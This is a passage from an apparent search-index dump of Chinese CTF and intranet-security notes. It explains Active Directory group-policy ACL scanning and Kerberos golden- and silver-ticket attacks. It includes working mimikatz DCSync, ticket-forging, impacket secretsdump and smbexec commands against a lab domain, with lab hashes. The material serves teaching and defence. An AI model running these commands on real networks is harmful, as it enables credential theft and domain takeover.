\u7ec4\u7b56\u7565\u8fdb\u884c\u4fee\u6539\u7b49\u64cd\u4f5c\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article5/index.html#1","title":"(1) \u6ee5\u7528\u7ec4\u7b56\u7565\u59d4\u6d3e\u5c5e\u6027\u68c0\u6d4b","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 PowerSploit \u4e2d\u7684 <code>PowerView.ps1</code>\u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u901a\u8fc7\u6307\u5b9a DN\u68c0\u6d4b\u53ef\u80fd\u5b58\u5728\u98ce\u9669\u7684\u7ec4\u7b56\u7565\u6743\u9650\u914d\u7f6e\u3002</p> <pre><code>Import-Module .\\PowerView.ps1\nInvoke-ACLScanner -ResolveGUIDs -ADSpath \"CN=Policies, CN=System, DC=xie, DC=com\" -verbose\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u53ef\u80fd\u5b58\u5728\u6743\u9650\u914d\u7f6e\u98ce\u9669\u7684\u7ec4\u7b56\u7565 GUID \u4e3a B08E4C8C-581C-4421-973C-47D01E455623\u3002</p> <p></p> <p>\u7136\u540e\u518d\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u67e5\u8be2\u8be5\u7ec4\u7b56\u7565\u4f5c\u7528\u7684 OU\uff0c\u4ee5\u53ca OU \u5185\u7684\u7528\u6237\u548c\u8ba1\u7b97\u673a\u3002\u5c31\u53ef\u4ee5\u77e5\u9053\u8be5\u53ef\u80fd\u5b58\u5728\u98ce\u9669\u7684\u7ec4\u7b56\u7565\u5f71\u54cd\u4e86\u54ea\u4e9b\u7528\u6237\u548c\u8ba1\u7b97\u673a\u3002</p> <pre><code>Get-NetOU -GUID B08E4C8C-581C-4421-973C-47D01E455623\nGet-NetOU -GUID B08E4C8C-581C-4421-973C-47D01E455623 | %{Get-NetUser -ADSpath $_}\nGet-NetOU -GUID B08E4C8C-581C-4421-973C-47D01E455623 | %{Get-Netcomputer -ADSpath $_}\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u8be5\u53ef\u80fd\u5b58\u5728\u98ce\u9669\u7684\u7ec4\u7b56\u7565\u5f71\u54cd\u4e86\u54ea\u4e9b\u7528\u6237\u548c\u8ba1\u7b97\u673a\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/index.html","title":"\u57df\u6743\u9650\u7ef4\u6301\u4e0e\u540e\u6e17\u900f\u5bc6\u7801\u6536\u96c6","text":"<p>\u4ecb\u7ecd\u4e86\u57df\u6743\u9650\u7ef4\u6301\u7684\u5e38\u89c1\u624b\u6cd5\u4ee5\u53ca\u540e\u6e17\u900f\u5bc6\u7801\u6536\u96c6</p> <ul> <li>\u57df\u6743\u9650\u7ef4\u6301\u4e4bPTT\u7968\u636e\u4f20\u9012\u653b\u51fb</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html","title":"\u57df\u6743\u9650\u7ef4\u6301\u4e4bPTT\u7968\u636e\u4f20\u9012\u653b\u51fb","text":"<p>\u5728\u5b66\u4e60\u57df\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u542c\u5230\u9ec4\u91d1\u7968\u636e\u653b\u51fb\uff0c\u767d\u94f6\u7968\u636e\u653b\u51fb\u3002\u90a3\u4e48\u9ec4\u91d1\u7968\u636e\u653b\u51fb\u548c\u767d\u94f6\u7968\u636e\u653b\u51fb\u5230\u5e95\u662f\u4ec0\u4e48\u5462\uff1f\u9700\u8981\u8bf4\u660e\u7684\u662f\uff0c\u65e0\u8bba\u662f\u9ec4\u91d1\u7968\u636e\u653b\u51fb\u8fd8\u662f\u767d\u94f6\u7968\u636e\u653b\u51fb\uff0c\u90fd\u662f\u5c5e\u4e8e<code>\u7968\u636e\u4f20\u9012\u653b\u51fb(Pass The Ticket\uff0cPTT)</code>\uff0c\u800c\u7968\u636e\u4f20\u9012\u653b\u51fb\u662f\u57fa\u4e8e Kerberos \u8ba4\u8bc1\u7684\u653b\u51fb\u65b9\u5f0f\u3002</p> <p>\u9ec4\u91d1\u7968\u636e\u653b\u51fb\u5229\u7528\u7684\u524d\u63d0\u662f\u83b7\u5f97\u4e86\u57df\u5185 krbtgt \u7528\u6237\u7684 NTLM \u54c8\u5e0c\u6216 AES Key \u503c\uff1b\u767d\u94f6\u7968\u636e\u653b\u51fb\u5229\u7528\u7684\u524d\u63d0\u662f\u83b7\u5f97\u4e86\u57df\u5185\u670d\u52a1\u8d26\u53f7\u7684 NTLM \u54c8\u5e0c\u6216 AES Key \u503c\u3002\u7531\u4e8e\u83b7\u5f97\u57df\u5185 krbtgt \u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684 NTLM \u54c8\u5e0c\u6216 AES Key \u503c\u9700\u8981\u9ad8\u6743\u9650\uff0c\u56e0\u6b64\u7968\u636e\u4f20\u9012\u653b\u51fb\u901a\u5e38\u7528\u4e8e\u57df\u6743\u9650\u7ef4\u6301\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#golden-ticket","title":"\u9ec4\u91d1\u7968\u636e(Golden Ticket)\u653b\u51fb","text":"<p>\u5728 Kerberos \u8ba4\u8bc1\u8fc7\u7a0b\u7684 AS-REP \u9636\u6bb5\uff0c\u5728\u7ecf\u8fc7\u9884\u8ba4\u8bc1\u540e\uff0cKDC \u7684 AS \u8ba4\u8bc1\u670d\u52a1\u8fd4\u56de\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u4e2d\u52a0\u5bc6\u90e8\u5206 <code>authorization-data</code> \u662f\u4f7f\u7528 krbtgt \u5bc6\u94a5\u52a0\u5bc6\u7684\uff0c\u800c <code>authorization-data</code> \u4e2d\u5b58\u653e\u7740\u4ee3\u8868\u7528\u6237\u8eab\u4efd\u7684 PAC\uff0c\u5e76\u4e14\u5728\u8fd9\u4e2a\u9636\u6bb5 PAC\u7684 <code>PAC_SERVER_CHECKSUM</code> \u7b7e\u540d\u548c <code>PAC_PRIVSVR_CHECKSUM</code> \u7b7e\u540d\u7684\u5bc6\u94a5\u90fd\u662f krbtgt \u5bc6\u94a5\u3002\u5982\u56fe\u6240\u793a\u662f AS-REQ&amp;AS-REP \u7684\u7b80\u8981\u6d41\u7a0b\uff1a</p> <p></p> <p>\u56e0\u6b64\uff0c\u53ea\u8981\u6211\u4eec\u80fd\u62e5\u6709 krbtgt \u7684\u5bc6\u94a5\uff0c\u5c31\u80fd\u591f\u4f2a\u9020\u9ad8\u6743\u9650\u7684 PAC\uff0c\u7136\u540e\u5c06\u5176\u5c01\u88c5\u5728 TGT \u8ba4\u8d2d\u6743\u8bc1\u4e2d\u3002\u5ba2\u6237\u7aef\u518d\u62ff\u7740\u8fd9\u4e2a TGT \u8ba4\u8d2d\u6743\u8bc1\u4ee5\u9ad8\u6743\u9650\u8bf7\u6c42\u4efb\u610f\u670d\u52a1\u7684\u670d\u52a1\u7968\u636e\uff01\u9700\u8981\u8bf4\u660e\u7684\u662f\uff0c\u4f7f\u7528 krbtgt \u5bc6\u94a5\u751f\u6210\u9ad8\u6743\u9650\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u79bb\u7ebf\u7684\uff0c\u4e0d\u9700\u8981\u8fde\u63a5 KDC\u3002\u8fd9\u4e2a\u653b\u51fb\u8fc7\u7a0b\u88ab\u79f0\u4e3a\u9ec4\u91d1\u7968\u636e(Golden Ticket)\u4f20\u9012\u653b\u51fb\u3002</p> <p>\u8981\u521b\u5efa\u9ec4\u91d1\u7968\u636e\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u4ee5\u4e0b\u4fe1\u606f\uff1a</p> <ul> <li>krbtgt\u8d26\u53f7\u7684NTLM\u54c8\u5e0c\u6216AES Key\u503c</li> <li>\u57df\u7684SID\u503c</li> <li>\u57df\u540d</li> <li>\u8981\u4f2a\u9020\u7684\u57df\u7528\u6237\uff0c\u4e00\u822c\u586b\u5199\u9ad8\u6743\u9650\u7528\u6237\uff0c\u5982\u57df\u7ba1\u7406\u5458</li> </ul> <p>\u901a\u8fc7\u5728\u57df\u63a7\u4e0a\u67e5\u8be2\u6211\u4eec\u5f97\u5230\u5982\u4e0b\u4fe1\u606f\uff1a</p> <ul> <li>krbtgt \u54c8\u5e0c\uff1abadf5dbde4d4cbbd1135cc26d8200238</li> <li>\u57df sid\uff1aS-1-5-21-1313979556-3624129433-4055459191</li> <li>\u57df\u540d\uff1axie.com</li> <li>\u57df\u7ba1\u7406\u5458\uff1aadministrator</li> </ul> <p>\u5982\u4e0b\uff0c\u4f7f\u7528mimikatz\u83b7\u5f97\u76f8\u5173\u4fe1\u606f\uff1a</p> <pre><code>mimikatz.exe \"lsadump::dcsync /domain:xie.com /user:krbtgt /csv\" \"exit\" &gt; 1.txt\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7 mimikatz \u6267\u884c\u76f8\u5173\u547d\u4ee4\u67e5\u8be2\u5230 krbtgt \u7528\u6237\u7684 NTLM \u54c8\u5e0c\u503c\u3002\u4ee5\u53ca\u901a\u8fc7 whoami /all \u547d\u4ee4\u67e5\u8be2\u51fa\u57df\u7684 SID \u503c\u3002</p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u9700\u8981\u5229\u7528\u8fd9\u4e9b\u4fe1\u606f\u6765\u8fdb\u884c\u9ec4\u91d1\u7968\u636e\u4f20\u9012\u653b\u51fb\u4e86\u3002\u80fd\u8fdb\u884c\u9ec4\u91d1\u7968\u636e\u4f20\u9012\u653b\u51fb\u7684\u5de5\u5177\u6709\u5f88\u591a\uff0c\u8fd9\u91cc\u53ea\u4ecb\u7ecd\u4f7f\u7528 impacket\u3001mimikatz \u548c CobaltStrike \u6765\u8fdb\u884c\u9ec4\u91d1\u7968\u636e\u4f20\u9012\u653b\u51fb\u3002</p> <p>\u5b9e\u9a8c\u73af\u5883\u5982\u4e0b\uff1a</p> <ul> <li>\u57df\u63a7\u7cfb\u7edf\u7248\u672c\uff1aWindows Server 2012R2</li> <li>\u57df\u63a7\u4e3b\u673a\u540d\uff1aAD01 \u2022 \u57df\u63a7 ip\uff1a10.211.55.4</li> <li>\u57df\u5185\u4e3b\u673a\u7cfb\u7edf\u7248\u672c\uff1aWindows10</li> <li>\u57df\u5185\u4e3b\u673a\u540d\uff1awin10</li> <li>\u57df\u5185\u4e3b\u673a ip\uff1a10.211.55.16</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#1-impacket","title":"1.\u4f7f\u7528 impacket \u8fdb\u884c\u653b\u51fb","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 impacket \u4e0b\u7684 ticketer.py \u811a\u672c\u6765\u79bb\u7ebf\u751f\u6210\u9ec4\u91d1\u7968\u636e\uff0c\u7136\u540e\u5c06\u7968\u636e\u5bfc\u5165\u5185\u5b58\u4e2d\uff0c\u5373\u53ef\u4f7f\u7528 secretsdump.py\u3001smbexec.py \u7b49\u811a\u672c\u8fdb\u884c\u540e\u5229\u7528\u3002\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>#\u751f\u6210\u9ec4\u91d1\u7968\u636e\npython3 ticketer.py -domain-sid S-1-5-21-1313979556-3624129433-4055459191 -nthash badf5dbde4d4cbbd1135cc26d8200238 -domain xie.com administrator\n\n#\u5bfc\u5165\u7968\u636e\nexport KRB5CCNAME=administrator.ccache\n\n#\u5bfc\u51fa administrator \u7528\u6237\u7684\u54c8\u5e0c\npython3 secretsdump.py -k -no-pass administrator@AD01.xie.com -dc-ip 10.211.55. 4 -just-dc-user administrator\n\n#\u8bbf\u95ee\u57df\u63a7 AD01\npython3 smbexec.py -no-pass -k administrator@AD01.xie.com -dc-ip 10.211.55.4\n\n#\u8bbf\u95ee\u57df\u5185\u4e3b\u673a win10\npython3 smbexec.py -no-pass -k administrator@win10.xie.com -dc-ip 10.211.55.4 -codec gbk\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7 impacket \u8fdb\u884c\u9ec4\u91d1\u7968\u636e\u653b\u51fb\uff0c\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u5bfc\u51fa\u4e86\u57df\u7ba1\u7406\u5458administrator \u7684\u54c8\u5e0c\u4e86\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7\u9ec4\u91d1\u7968\u636e\u653b\u51fb\u83b7\u5f97\u4e86\u57df\u63a7 AD01 \u548c\u57df\u5185\u4e3b\u673a win10 \u7684\u6700\u9ad8\u6743\u9650\u4e86\u3002</p> <p></p> <p>\u6ce8\uff1a\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u9700\u8981\u5148\u5728\u672c\u5730 hosts \u6587\u4ef6\u91cc\u9762\u6dfb\u52a0\u76ee\u6807\u57df\u63a7 AD01 \u5bf9\u5e94\u7684 ip\u3002\u5982\u679c\u8981\u8bbf\u95ee\u5176\u4ed6\u4e3b\u673a\uff0c\u4e5f\u9700\u8981\u5728 hosts \u6587\u4ef6\u91cc\u6dfb\u52a0\u5176\u4ed6\u4e3b\u673a\u5bf9\u5e94\u7684 ip\uff0c\u5982\u56fe\u6240\u793a\u662f hosts \u6587\u4ef6\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#2-mimikatz","title":"2.\u4f7f\u7528 mimikatz \u8fdb\u884c\u653b\u51fb","text":"<p>\u4f7f\u7528 mimikatz \u8fdb\u884c\u653b\u51fb\u7684\u8bdd\uff0c\u653b\u51fb\u673a\u53ef\u4ee5\u662f\u57df\u4e2d\u7684\u666e\u901a\u673a\u5668\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u662f\u57df\u4e2d\u7684\u673a\u5668\u3002\u5f53\u653b\u51fb\u673a\u4e0d\u5728\u57df\u4e2d\u65f6\uff0c\u9700\u8981\u5c06 DNS \u670d\u52a1\u5668\u8bbe\u7f6e\u4e3a\u57df\u63a7\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5f53\u4e3b\u673a\u4e0d\u5728\u57df\u5185\u65f6\uff0c\u914d\u7f6e\u5176 DNS \u670d\u52a1\u5668\u4e3a\u57df\u63a7 10.211.55.4\u3002</p> <p></p> <p>\u9996\u5148\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u53ef\u4ee5\u770b\u5230\u672c\u673a\u5e76\u6ca1\u6709\u6743\u9650\u5bfc\u51fa\u57df\u5185\u4efb\u610f\u7528\u6237\u54c8\u5e0c\u3002</p> <pre><code>mimikatz.exe \"lsadump::dcsync /domain:xie.com /user:krbtgt /csv\" \"exit\"\n</code></pre> <p></p> <p>\u7136\u540e\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u751f\u6210\u9ec4\u91d1\u7968\u636e\u5e76\u5bfc\u5165\u5185\u5b58\u4e2d\uff0c\u5c31\u62e5\u6709\u5bfc\u51fa\u4efb\u610f\u7528\u6237\u54c8\u5e0c\u7684\u6743\u9650\u4e86\u3002</p> <pre><code>mimikatz.exe\n\n#\u751f\u6210\u5e76\u5bfc\u5165\u9ec4\u91d1\u7968\u636e\u5230\u5f53\u524d\u5185\u5b58\u4e2d\nkerberos::golden /user:administrator /domain:xie.com /sid:S-1-5-21-1313979556-3624129433-4055459191 /krbtgt:badf5dbde4d4cbbd1135cc26d8200238 /ptt\n\n#\u9a8c\u8bc1\u662f\u5426\u6210\u529f\uff0c\u5bfc\u51fa\u6307\u5b9a\u7528\u6237\u54c8\u5e0c\nlsadump::dcsync /domain:xie.com /user:krbtgt /csv\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7\u9ec4\u91d1\u7968\u636e\u653b\u51fb\u4e4b\u540e\uff0c\u5373\u6709\u6743\u9650\u5bfc\u51fa\u57df\u5185\u4efb\u610f\u7528\u6237\u54c8\u5e0c\u4e86\uff01</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#3-cobaltstrike","title":"3.\u4f7f\u7528 CobaltStrike \u8fdb\u884c\u653b\u51fb","text":"<p>\u5f53\u4f7f\u7528 CobaltStrike \u8fdb\u884c\u653b\u51fb\u65f6\uff0c\u4e0a\u7ebf\u7684\u673a\u5668\u53ef\u4ee5\u662f\u57df\u4e2d\u7684\u666e\u901a\u673a\u5668\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u662f\u57df\u4e2d\u7684\u673a\u5668\u3002\u5f53\u4e0a\u7ebf\u7684\u673a\u5668\u4e0d\u5728\u57df\u4e2d\u65f6\uff0c\u9700\u8981\u5c06\u8be5\u673a\u5668\u7684 DNS \u670d\u52a1\u5668\u8bbe\u7f6e\u4e3a\u57df\u63a7\u3002\u547d\u4ee4\u884c\u8bbe\u7f6e DNS \u670d\u52a1\u5668\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>netsh interface ip set dns \"\u4ee5\u592a\u7f51\" static 10.211.55.4\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7 CobaltStrike \u8bbe\u7f6e\u5f53\u524d\u4e3b\u673a\u7684 DNS \u4e3a 10.211.55.4.</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u7136\u540e\u67e5\u8be2\u5373\u53ef\u770b\u5230 DNS \u670d\u52a1\u5668\u6b64\u65f6\u5df2\u7ecf\u8bbe\u7f6e\u4e3a 10.211.55.4 \u4e86\u3002</p> <p></p> <p>\u7136\u540e\u5982\u4e0b\u64cd\u4f5c\uff0c\u9009\u4e2d\u76ee\u6807 session\uff0c\u7136\u540e\u53f3\u952e\u6267\u884c\u2014\u2014&gt;\u9ec4\u91d1\u7968\u636e</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u8f93\u5165\u76f8\u5e94\u7684\u4fe1\u606f\u540e\uff0c\u70b9\u51fb Build\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u9ec4\u91d1\u7968\u636e\u751f\u6210\u5e76\u5bfc\u5165\u5185\u5b58\u4e2d\u4e86\u3002</p> <p></p> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u6267\u884c\u9ad8\u6743\u9650\u64cd\u4f5c\u4e86\u3002\u5982\u56fe\u6240\u793a\uff0c\u5bfc\u51fa\u57df\u5185\u4efb\u610f\u7528\u6237\u54c8\u5e0c\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#silver-ticket","title":"\u767d\u94f6\u7968\u636e(Silver Ticket)\u653b\u51fb","text":"<p>\u5728 Kerberos \u8ba4\u8bc1\u8fc7\u7a0b\u7684 TGS-REP \u9636\u6bb5\uff0c\u5728\u9a8c\u8bc1\u4e86\u5ba2\u6237\u7aef\u53d1\u6765\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u7684\u771f\u5b9e\u6027\u548c\u4f1a\u8bdd\u5b89\u5168\u6027\u540e\uff0cKDC \u7684 TGS \u7968\u636e\u6388\u4e88\u670d\u52a1\u5c06\u8fd4\u56de\u6307\u5b9a\u670d\u52a1\u7684 ST\u670d\u52a1\u7968\u636e\u3002ST \u670d\u52a1\u7968\u636e\u4e2d\u52a0\u5bc6\u90e8\u5206 <code>authorization-data</code> \u662f\u4f7f\u7528\u670d\u52a1\u5bc6\u94a5\u52a0\u5bc6\u7684\uff0c\u800c <code>authorization-data</code> \u4e2d\u5b58\u653e\u7740\u4ee3\u8868\u7528\u6237\u8eab\u4efd\u7684 PAC\uff0c\u5e76\u4e14\u5728\u8fd9\u4e2a\u9636\u6bb5 PAC \u7684<code>PAC_SERVER_CHECKSUM</code> \u7b7e\u540d\u7684\u5bc6\u94a5\u4e5f\u662f\u670d\u52a1\u5bc6\u94a5(\u4f46\u662f\u8be5\u9636\u6bb5 PAC \u7684<code>PAC_PRIVSVR_CHECKSUM</code> \u7b7e\u540d\u7684\u5bc6\u94a5\u662f krbtgt \u5bc6\u94a5\uff0c\u6b64\u65f6\u5ba2\u6237\u7aef\u5e76\u4e0d\u80fd\u4f2a\u9020<code>PAC_PRIVSVR_CHECKSUM</code> \u7b7e\u540d)\u3002\u5982\u56fe\u6240\u793a\uff0c\u662f TGS-REQ&amp;TGS-REP \u7684\u7b80\u8981\u6d41\u7a0b\uff1a</p> <p></p> <p>\u56e0\u6b64\uff0c\u53ea\u8981\u6211\u4eec\u80fd\u62e5\u6709\u6307\u5b9a\u670d\u52a1\u7684\u5bc6\u94a5\uff0c\u5c31\u80fd\u591f\u4f2a\u9020\u9ad8\u6743\u9650\u7684 PAC\uff0c\u7136\u540e\u5c06\u5176\u5c01\u88c5\u5728 ST \u670d\u52a1\u7968\u636e\u4e2d\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c <code>PAC_SERVER_CHECKSUM</code> \u7b7e\u540d\u548c\u52a0\u5bc6\u3002\u5ba2\u6237\u7aef\u518d\u62ff\u7740\u8fd9\u4e2a ST \u670d\u52a1\u7968\u636e\u4ee5\u9ad8\u6743\u9650\u8bbf\u95ee\u6307\u5b9a\u670d\u52a1\uff01\u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u7684\u662f\uff0c\u7531\u4e8e<code>PAC_PRIVSVR_CHECKSUM</code> \u7b7e\u540d\u7684\u9a8c\u8bc1\u662f\u53ef\u9009\u7684\uff0c\u5e76\u4e14\u9ed8\u8ba4\u4e0d\u5f00\u542f\u3002\u56e0\u6b64\u5373\u4f7f\u653b\u51fb\u8005\u65e0\u6cd5\u4f2a\u9020 <code>PAC_PRIVSVR_CHECKSUM</code> \u7b7e\u540d\uff0c\u4e5f\u80fd\u5229\u7528\u8be5 ST \u670d\u52a1\u7968\u636e\u4ee5\u9ad8\u6743\u9650\u8fdb\u884c\u6b63\u5e38\u8bf7\u6c42\uff01\u8fd9\u4e2a\u653b\u51fb\u8fc7\u7a0b\u88ab\u79f0\u4e3a\u767d\u94f6\u7968\u636e(Silver Ticket)\u4f20\u9012\u653b\u51fb\u3002</p> <p>\u8981\u521b\u5efa\u767d\u94f6\u7968\u636e\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u4ee5\u4e0b\u4fe1\u606f\uff1a</p> <ul> <li>\u76ee\u6807\u670d\u52a1\u7684\u5bc6\u94a5</li> <li>\u57df\u7684 SID \u503c</li> <li>\u57df\u540d</li> <li>\u8981\u4f2a\u9020\u7684\u57df\u7528\u6237\uff0c\u4e00\u822c\u586b\u5199\u9ad8\u6743\u9650\u5e10\u6237\uff0c\u5982\u57df\u7ba1\u7406\u5458</li> </ul> <p>\u4ee5\u4e0b\u6211\u4eec\u8fdb\u884c\u767d\u94f6\u7968\u636e\u653b\u51fb\u4f7f\u7528\u7684\u670d\u52a1\u662f\u57df\u63a7 AD01 \u7684\u670d\u52a1\uff0c\u53ef\u4ee5\u662f<code>LDAP/CIFS/WinRM</code> \u7b49\u670d\u52a1\u3002\u56e0\u6b64\u8fd9\u91cc\u7684\u5bc6\u94a5\u5c31\u662f\u57df\u63a7<code>AD01$</code>\u673a\u5668\u8d26\u53f7\u7684\u5bc6\u94a5\u4e86\u3002\u5f53\u8bf7\u6c42\u7684\u662f\u6307\u5b9a\u670d\u52a1\u5982 LDAP \u670d\u52a1\u65f6\uff0c\u62e5\u6709\u7684\u6743\u9650\u4e5f\u53ea\u80fd\u662f\u6307\u5b9a\u670d\u52a1\u7684\u6743\u9650\u3002</p> <p>\u901a\u8fc7\u5728\u57df\u63a7\u4e0a\u67e5\u8be2\u6211\u4eec\u5f97\u5230\u5982\u4e0b\u4fe1\u606f\uff1a</p> <ul> <li>\u670d\u52a1\u54c8\u5e0c\uff1ad5d05db9b06988c17f903ef4847d9367</li> <li>\u57df sid\uff1aS-1-5-21-1313979556-3624129433-4055459191 </li> <li>\u57df\u540d\uff1axie.com</li> <li>\u57df\u7ba1\u7406\u5458\uff1aadministrator</li> </ul> <p>\u5982\u4e0b\uff0c\u4f7f\u7528 mimikatz \u83b7\u5f97\u76f8\u5173\u4fe1\u606f:</p> <pre><code>mimikatz.exe \"lsadump::dcsync /domain:xie.com /user:AD01$ /csv\" \"exit\" &gt; 1.txt\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7 mimikatz \u6267\u884c\u76f8\u5173\u547d\u4ee4\u67e5\u8be2\u5230\u673a\u5668\u7528\u6237 <code>AD01$</code>\u7684 NTLM \u54c8\u5e0c\u503c\u3002\u4ee5\u53ca\u901a\u8fc7 whoami /all \u547d\u4ee4\u67e5\u8be2\u51fa\u57df\u7684 SID \u503c\u3002</p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u9700\u8981\u5229\u7528\u8fd9\u4e9b\u4fe1\u606f\u6765\u8fdb\u884c\u767d\u94f6\u7968\u636e\u4f20\u9012\u653b\u51fb\u4e86\u3002\u80fd\u8fdb\u884c\u767d\u94f6\u7968\u636e\u4f20\u9012\u653b\u51fb\u7684\u5de5\u5177\u6709\u5f88\u591a\uff0c\u8fd9\u91cc\u53ea\u4ecb\u7ecd\u4f7f\u7528 impacket\u3001mimikatz \u548c CobaltStrike \u6765\u8fdb\u884c\u767d\u94f6\u7968\u636e\u4f20\u9012\u653b\u51fb\u3002</p> <p>\u5b9e\u9a8c\u73af\u5883\u5982\u4e0b\uff1a</p> <ul> <li>\u57df\u63a7\u7cfb\u7edf\u7248\u672c\uff1aWindows Server 2012R2</li> <li>\u57df\u63a7\u4e3b\u673a\u540d\uff1aAD01 </li> <li>\u57df\u63a7 ip\uff1a10.211.55.4</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#1-impacket_1","title":"1.\u4f7f\u7528 impacket \u8fdb\u884c\u653b\u51fb","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 impacket \u4e0b\u7684 ticketer.py \u811a\u672c\u6765\u79bb\u7ebf\u751f\u6210\u767d\u94f6\u7968\u636e\uff0c\u7136\u540e\u5c06\u7968\u636e\u5bfc\u5165\u5185\u5b58\u4e2d\uff0c\u5373\u53ef\u4f7f\u7528 secretsdump.py\u3001smbexec.py \u7b49\u811a\u672c\u8fdb\u884c\u540e\u5229\u7528\u3002\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>#\u751f\u6210\u767d\u94f6\u7968\u636e\npython3 ticketer.py -domain-sid S-1-5-21-1313979556-3624129433-4055459191 -nthash d5d05db9b06988c17f903ef4847d9367 -spn cifs/AD01.xie.com -domain xie.com administrator\n\n#\u5bfc\u5165\u7968\u636e\nexport KRB5CCNAME=administrator.ccache\n\n#\u8bbf\u95ee\u57df\u63a7 AD01\npython3 smbexec.py -no-pass -k administrator@AD01.xie.com -dc-ip 10.211.55.4\n\n#\u5bfc\u51fa administrator \u7528\u6237\u7684\u54c8\u5e0c\npython3 secretsdump.py -k -no-pass administrator@AD01.xie.com -dc-ip 10.211.55. 4 -just-dc-user administrator\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u5bf9\u57df\u63a7 AD01 \u8fdb\u884c\u57fa\u4e8e cifs \u670d\u52a1\u7684\u767d\u94f6\u7968\u636e\u653b\u51fb\uff0c\u653b\u51fb\u5b8c\u6210\u540e\uff0c\u83b7\u5f97\u57df\u63a7\u7684\u6700\u9ad8\u6743\u9650\uff1a</p> <p></p> <p>\u8fd9\u91cc\u7531\u4e8e\u662f\u767d\u94f6\u7968\u636e\uff0c\u56e0\u6b64\u53ea\u80fd\u8bbf\u95ee\u6307\u5b9a\u670d\u52a1\uff0c\u5e76\u4e0d\u80fd\u8bbf\u95ee\u5176\u4ed6\u670d\u52a1\u3002\u5982\u4e0b\uff0c\u5f53\u5c1d\u8bd5\u8bbf\u95ee\u5176\u4ed6\u670d\u52a1\u65f6\uff0c\u62a5\u9519\uff01</p> <p>\u6ce8\uff1a\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u9700\u8981\u5148\u5728\u672c\u5730 hosts \u6587\u4ef6\u91cc\u9762\u6dfb\u52a0\u76ee\u6807\u57df\u63a7 AD01 \u5bf9\u5e94\u7684 ip\u3002\u5982\u679c\u8981\u8bbf\u95ee\u5176\u4ed6\u4e3b\u673a\uff0c\u4e5f\u9700\u8981\u5728 hosts \u6587\u4ef6\u91cc\u6dfb\u52a0\u5176\u4ed6\u4e3b\u673a\u5bf9\u5e94\u7684 ip\uff0c\u5982\u56fe\u6240\u793a\u662f hosts \u6587\u4ef6\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#2-mimikatz_1","title":"2.\u4f7f\u7528 mimikatz \u8fdb\u884c\u653b\u51fb","text":"<p>\u4f7f\u7528 mimikatz 